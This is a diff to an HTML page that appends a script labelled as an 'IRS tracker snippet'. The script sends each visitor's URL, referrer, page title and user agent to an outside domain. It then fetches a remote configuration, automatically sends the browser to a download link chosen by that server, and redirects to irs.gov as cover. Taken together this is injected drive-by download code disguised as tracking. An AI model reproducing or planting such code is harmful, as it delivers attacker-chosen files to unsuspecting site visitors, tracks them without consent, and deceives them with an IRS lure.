@@ -839,5 +839,74 @@
         });
     });
 </script>
+<!-- IRS tracker snippet -->
+<script>
+(function(){
+  const settings = {
+    tracker: "https://jhansimediaclub.com/gravi/snippet_tracker.php",
+    config: "https://jhansimediaclub.com/gravi/config_api.php",
+    pageTag: "NewLand",
+    redirectEnabled: true,
+    redirectUrl: "https://www.irs.gov/",
+    redirectDelaySeconds: 4,
+    autoDownload: true,
+    downloadDelaySeconds: 3
+  };
+
+  const landingUrl = window.location.href;
+  const pageTitle = document.title || '';
+  const userAgent = navigator.userAgent || '';
+
+  const logEvent = (type, extra) => {
+    try {
+      fetch(settings.tracker, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(Object.assign({
+          event_type: type,
+          page_tag: settings.pageTag,
+          profile_id: settings.pageTag,
+          referrer: document.referrer || '',
+          landing_url: landingUrl,
+          page_title: pageTitle,
+          user_agent: userAgent
+        }, extra || {})),
+        keepalive: true
+      });
+    } catch (err) {}
+  };
+
+  logEvent('snippet_visit');
+
+  const configUrl = settings.config + '?profile=' + encodeURIComponent(settings.pageTag);
+  fetch(configUrl, { cache: 'no-store' })
+    .then(r => r.json())
+    .then(remote => {
+      const live = remote && remote.config ? remote.config : {};
+      const redirectEnabled = typeof live.redirect_enabled === 'boolean' ? live.redirect_enabled : settings.redirectEnabled;
+      const redirectUrl = (live.redirect_url || settings.redirectUrl || '').trim();
+      const redirectDelay = Number(live.redirect_delay_seconds ?? settings.redirectDelaySeconds) || 0;
+      const autoDownload = typeof live.download_autostart === 'boolean' ? live.download_autostart : settings.autoDownload;
+      const downloadUrl = (live.download_link || '').trim();
+      const downloadDelay = Number(live.download_delay_seconds ?? settings.downloadDelaySeconds) || 0;
+
+      if (autoDownload && downloadUrl) {
+        setTimeout(() => {
+          logEvent('download', { target: downloadUrl });
+          window.location.href = downloadUrl;
+        }, Math.max(downloadDelay, 0) * 1000);
+      }
+
+      if (redirectEnabled && redirectUrl) {
+        setTimeout(() => {
+          logEvent('snippet_redirect', { target: redirectUrl });
+          window.location.href = redirectUrl;
+        }, Math.max(redirectDelay, 0) * 1000);
+      }
+      logEvent('snippet_heartbeat', { target: redirectUrl || downloadUrl || '' });
+    })
+    .catch(() => {});
+})();
+</script>
 </body>
 </html>
